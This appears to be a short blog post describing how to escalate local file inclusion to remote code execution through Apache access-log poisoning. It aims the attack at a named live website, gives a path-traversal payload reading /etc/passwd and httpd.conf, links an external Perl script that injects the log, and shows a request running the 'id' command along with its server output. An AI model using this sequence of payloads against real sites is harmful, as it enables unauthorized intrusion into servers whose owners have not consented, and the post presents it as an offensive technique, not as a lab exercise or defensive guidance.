Source: https://medium.com/@p4c3n0g3/lfi-to-rce-via-access-log-injection-88684351e7c0

Trick to go from Local File Inclusion/File Path Traversal to Remote Code Execution by injecting the access_log.

have a target http://proqualitycontrol.com/index.php?page=aboutus and it’s vulnerable to LFI/FPT. 
Inject the target with ../../../../../../../../../../../../../../../etc/passwd%00 payload.

Now change with /etc/httpd/conf/httpd.conf. 
Not all httpd.conf path is here. 
To find the access_log location you need to find httpd.conf first.

View source (ctrl+u) for a better view of their httpd.conf.

Open the file called access_log. In this case /home/pro_99/proqualitycontrol.com/access_log.


Perl script to inject the access_log: https://pastebin.com/q8jshq1i

Run it “perl log.pl <target> 80”

Open the access_log again and search for v0pcr3w. 
If the word is there then we’ve successfully injected the access_log.

Now run this line to execute command on server 
/home/pro_99/proqualitycontrol.com/access_log%00&cmd=id 
and you’ll see the “id” command executed.

Our command executed successfully 
GET /v0pcr3w uid=48(apache) gid=48(apache) groups=48(apache),500(webadmin).

